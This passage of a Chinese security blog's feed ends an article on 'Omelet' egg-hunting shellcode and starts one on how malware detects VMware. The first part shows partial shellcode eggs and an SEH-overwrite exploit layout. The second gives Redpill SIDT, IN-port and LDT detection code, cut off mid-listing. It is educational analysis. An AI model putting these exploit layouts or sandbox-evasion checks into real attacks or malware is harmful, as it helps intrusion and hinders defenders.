class=&quot;line&quot;&gt; // These are the eggs that need to be injected into the target process &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; // &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; the omelet shellcode to be able to recreate the original shellcode&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; // (you can insert them &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; many times &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; you want, &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; long &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; each one &lt;span class=&quot;keyword&quot;&gt;is&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; // inserted at least once). They are &lt;span class=&quot;number&quot;&gt;127&lt;/span&gt; bytes each:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; egg0 = &lt;span class=&quot;string&quot;&gt;&quot;\x3B\xFF\x76\x08\x28\x33\xC9\x64\x8B\x71\x30\x8B ... \x57\x51\x57&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; egg1 = &lt;span class=&quot;string&quot;&gt;&quot;\x3B\xFE\x76\x08\x28\x8D\x7E\xEA\xB0\x81\x3C\xD3 ... \x24\x03\xCD&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; egg2 = &lt;span class=&quot;string&quot;&gt;&quot;\x3B\xFD\x76\x08\x28\x0F\xB7\x3C\x79\x8B\x4B\x1C ... \x47\xF1\x01&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;生成文件后我们就可以在实际漏洞利用中构造出类似下面这样的exploit：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;【junk】【nseh(jmp 06)】【seh(pop pop ret)】【nops】【omelet_code】【junk】【egg0】【junk】【egg1】【junk】【egg2】&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;不过具体的实际漏洞利用还得受一些操作环境影响，得视具体情况进行变化，同时还需要一点运气！&lt;/p&gt;
&lt;h3 id=&quot;结语&quot;&gt;&lt;a href=&quot;#结语&quot; class=&quot;headerlink&quot; title=&quot;结语&quot;&gt;&lt;/a&gt;结语&lt;/h3&gt;&lt;p&gt;本文就Omelet Shellcode进行简单地分析，阐述了shellcode分段执行技术的基本原理，并对其使用进行简单的讲解，以帮助大家更好地理解并应用好Omelet Shellcode。在本文是笔者只是起到了一个抛砖引玉的作用，关于shellcode的编写还有很多技术性，同时也需要一定的艺术性，这些都需要靠大家共同来打造和分享，如果你有更多关于这方面的资料和技术，希望可以跟我分享’&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;由于在实际溢出利用中，我们可能会遇到内存中没有足够的空间来存放我们的shellcode，但我们又可以控制多块小内存空间的内容，那些此时我们就
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="shellcode" scheme="http://riusksk.github.io/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>虚拟机检测技术剖析</title>
    <link href="http://riusksk.github.io/2010/08/27/vmcheck/"/>
    <id>http://riusksk.github.io/2010/08/27/vmcheck/</id>
    <published>2010-08-26T16:00:00.000Z</published>
    <updated>2016-06-23T03:00:16.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在当今信息安全领域，特别是恶意软件分析中，经常需要利用到虚拟机技术，以提高病毒分析过程的安全性以及硬件资源的节约性，因此它在恶意软件领域中是应用越来越来广泛。这里我们所谓的虚拟机（Virtual Machine）是指通过软件模拟的具有完整硬件系统功能的、运行在一个完全隔离环境中的完整计算机系统。通过虚拟机软件（比如VMware，Virtual PC ,VirtualBox），你可以在一台物理计算机上模拟出一台或多台虚拟的计算机，这些虚拟机完全就像真正的计算机那样进行工作，例如你可以安装操作系统、安装应用程序、访问网络资源等等。攻击者为了提高恶意程序的隐蔽性以及破坏真实主机的成功率，他们都在恶意程序中加入检测虚拟机的代码，以判断程序所处的运行环境。当发现程序处于虚拟机（特别是蜜罐系统）中时，它就会改变操作行为或者中断执行，以此提高反病毒人员分析恶意软件行为的难度。本文主要针对基于Intel CPU的虚拟环境VMware中的Windows XP SP3系统进行检测分析，并列举出当前常见的几种虚拟机检测方法。&lt;/p&gt;
&lt;h3 id=&quot;方法一：通过执行特权指令来检测虚拟机&quot;&gt;&lt;a href=&quot;#方法一：通过执行特权指令来检测虚拟机&quot; class=&quot;headerlink&quot; title=&quot;方法一：通过执行特权指令来检测虚拟机&quot;&gt;&lt;/a&gt;方法一：通过执行特权指令来检测虚拟机&lt;/h3&gt;&lt;p&gt;Vmware为真主机与虚拟机之间提供了相互沟通的通讯机制，它使用“IN”指令来读取特定端口的数据以进行两机通讯，但由于IN指令属于特权指令，在处于保护模式下的真机上执行此指令时，除非权限允许，否则将会触发类型为“EXCEPTION_PRIV_INSTRUCTION”的异常，而在虚拟机中并不会发生异常，在指定功能号0A（获取VMware版本）的情况下，它会在EBX中返回其版本号“VMXH”；而当功能号为0x14时，可用于获取VMware内存大小，当大于0时则说明处于虚拟机中。VMDetect正是利用前一种方法来检测VMware的存在，其检测代码分析如下：&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;bool IsInsideVMWare()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  bool rc = true;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  __try&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    __asm&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      push   edx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      push   ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      push   ebx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      mov    eax, &#39;VMXh&#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      mov    ebx, 0  // 将ebx设置为非幻数’VMXH’的其它值&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      mov    ecx, 10 // 指定功能号，用于获取VMWare版本，当它为0x14时用于获取VMware内存大小&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      mov    edx, &#39;VX&#39; // 端口号&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      in     eax, dx // 从端口dx读取VMware版本到eax&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      		     //若上面指定功能号为0x14时，可通过判断eax中的值是否大于0，若是则说明处于虚拟机中&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      cmp    ebx, &#39;VMXh&#39; // 判断ebx中是否包含VMware版本’VMXh’，若是则在虚拟机中&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      setz   [rc] // 设置返回值&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      pop    ebx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      pop    ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      pop    edx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  __except(EXCEPTION_EXECUTE_HANDLER)  //如果未处于VMware中，则触发此异常&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    rc = false;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  return rc;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试结果：&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/vmcheck/1.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;                 图1&lt;br&gt;&lt;/center&gt;

&lt;p&gt;如图1所示，VMDetect成功检测出VMWare的存在。&lt;/p&gt;
&lt;h3 id=&quot;方法二：利用IDT基址检测虚拟机&quot;&gt;&lt;a href=&quot;#方法二：利用IDT基址检测虚拟机&quot; class=&quot;headerlink&quot; title=&quot;方法二：利用IDT基址检测虚拟机&quot;&gt;&lt;/a&gt;方法二：利用IDT基址检测虚拟机&lt;/h3&gt;&lt;p&gt;利用IDT基址检测虚拟机的方法是一种通用方式，对VMware和Virtual PC均适用。中断描述符表IDT（Interrupt Descriptor Table）用于查找处理中断时所用的软件函数，它是一个由256项组成的数据，其中每一中断对应一项函数。为了读取IDT基址，我们需要通过SIDT指令来读取IDTR（中断描述符表寄存器，用于IDT在内存中的基址），SIDT指令是以如下格式来存储IDTR的内容：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    WORD IDTLimit;    &lt;span class=&quot;comment&quot;&gt;// IDT的大小&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    WORD LowIDTbase;  &lt;span class=&quot;comment&quot;&gt;// IDT的低位地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    WORD HiIDTbase; &lt;span class=&quot;comment&quot;&gt;// IDT的高位地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; IDTINFO;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由于只存在一个IDTR，但又存在两个操作系统，即虚拟机系统和真主机系统。为了防止发生冲突，VMM（虚拟机监控器）必须更改虚拟机中的IDT地址，利用真主机与虚拟机环境中执行sidt指令的差异即可用于检测虚拟机是否存在。著名的“红丸”（redpill）正是利用此原理来检测VMware的。Redpill作者在VMware上发现虚拟机系统上的IDT地址通常位于0xFFXXXXXX，而Virtual PC通常位于0xE8XXXXXX，而在真实主机上正如图2所示都位于0x80xxxxxx。Redpill仅仅是通过判断执行SIDT指令后返回的第一字节是否大于0xD0，若是则说明它处于虚拟机，否则处于真实主机中。Redpill的源码甚是精简，源码分析如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; m[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;+&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;], rpill[] = &lt;span class=&quot;string&quot;&gt;&quot;\x0f\x01\x0d\x00\x00\x00\x00\xc3&quot;&lt;/span&gt;; &lt;span class=&quot;comment&quot;&gt;//相当于SIDT[adrr],其中addr用于保存IDT地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  *((unsigned*)&amp;amp;rpill[&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;]) = (unsigned)m;  &lt;span class=&quot;comment&quot;&gt;//将sidt[addr]中的addr设为m的地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ((void(*)())&amp;amp;rpill)();  &lt;span class=&quot;comment&quot;&gt;//执行SIDT指令，并将读取后IDT地址保存在数组m中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&quot;idt base: %#x\n&quot;&lt;/span&gt;, *((unsigned*)&amp;amp;m[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;]));  &lt;span class=&quot;comment&quot;&gt;//由于前2字节为IDT大小，因此从m[2]开始即为IDT地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (m[&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;]&amp;gt;&lt;span class=&quot;number&quot;&gt;0xd0&lt;/span&gt;) &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&quot;Inside Matrix!\n&quot;&lt;/span&gt;, m[&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;]); &lt;span class=&quot;comment&quot;&gt;//当IDT基址大于0xd0xxxxxx时则说明程序处于VMware中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&quot;Not in Matrix.\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试结果如图2所示：&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/vmcheck/2.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;                                     图2&lt;br&gt;&lt;/center&gt;                                     

&lt;p&gt;利用此IDT检测的方法存在一个缺陷，由于IDT的值只针对处于正在运行的处理器而言，在单CPU中它是个常量，但当它处于多CPU时就可能会受到影响了，因为每个CPU都有其自己的IDT，这样问题就自然而然的产生了。针对此问题，Offensive Computing组织成员提出了两种应对方法，其中一种方法就是利用Redpill反复地在系统上循环执行任务，以此构造出一张当前系统的IDT值变化统计图，但这会增加CPU负担；另一种方法就是windows API函数SetThreadAffinityMask()将线程限制在单处理器上执行，当执行此测试时只能准确地将线程执行环境限制在本地处理器，而对于将线程限制在VM处理器上就可能行不通了，因为VM是计划在各处理器上运行的，VM线程在不同的处理器上执行时，IDT值将会发生变化，因此此方法也是很少被使用的。为此，有人提出了使用LDT的检测方法，它在具有多个CPU的环境下检测虚拟机明显优于IDT检测方法，该方法具体内容参见下节内容。&lt;/p&gt;
&lt;h3 id=&quot;方法三：利用LDT和GDT的检测方法&quot;&gt;&lt;a href=&quot;#方法三：利用LDT和GDT的检测方法&quot; class=&quot;headerlink&quot; title=&quot;方法三：利用LDT和GDT的检测方法&quot;&gt;&lt;/a&gt;方法三：利用LDT和GDT的检测方法&lt;/h3&gt;&lt;p&gt;在 《Intel® 64 and IA-32  Architecture Software Developer’s Manual Volume 3A: System Programming Guide》第二章的Vol.3 2-5 一页（我的Intel开发手册是2008版的）中对于LDT和GDT的描述如下（以下内容为个人翻译）：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在保护模式下，所有的内存访问都要通过全局描述符表（GDT）或者本地描述符表（LDT）才能进行。这些表包含有段描述符的调用入口。各个段描述符都包含有各段的基址，访问权限，类型和使用信息，而且每个段描述符都拥有一个与之相匹配的段选择子，各个段选择子都为软件程序提供一个GDT或LDT索引（与之相关联的段描述符偏移量），一个全局/本地标志（决定段选择子是指向GDT还是LDT），以及访问权限信息。&lt;br&gt;若想访问段中的某一字节，必须同时提供一个段选择子和一个偏移量。段选择子为段提供可访问的段描述符地址（在GDT 或者LDT 中）。通过段描述符，处理器从中获取段在线性地址空间里的基址，而偏移量用于确定字节地址相对基址的位置。假定处理器在当前权限级别（CPL）可访问这个段，那么通过这种机制就可以访问在GDT 或LDT 中的各种有效代码、数据或者堆栈段，这里的CPL是指当前可执行代码段的保护级别。&lt;br&gt;……&lt;br&gt;GDT的线性基址被保存在GDT寄存器（GDTR）中，而LDT的线性基址被保存在LDT寄存器（LDTR）中。 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;由于虚拟机与真实主机中的GDT和LDT并不能相同，这与使用IDT的检测方法一样，因此虚拟机必须为它们提供一个“复制体”。关于GDT和LDT的基址可通过SGDT和SLDT指令获取。虚拟机检测工具Scoopy suite的作者Tobias Klein经测试发现，当LDT基址位于0x0000（只有两字节）时为真实主机，否则为虚拟机，而当GDT基址位于0xFFXXXXXX时说明处于虚拟机中，否则为真实主机。具体实现代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;LDTDetect&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;short&lt;/span&gt; ldt_addr = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; ldtr[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    _asm sldt ldtr&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ldt_addr = *((unsigned short *)&amp;amp;ldtr);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span 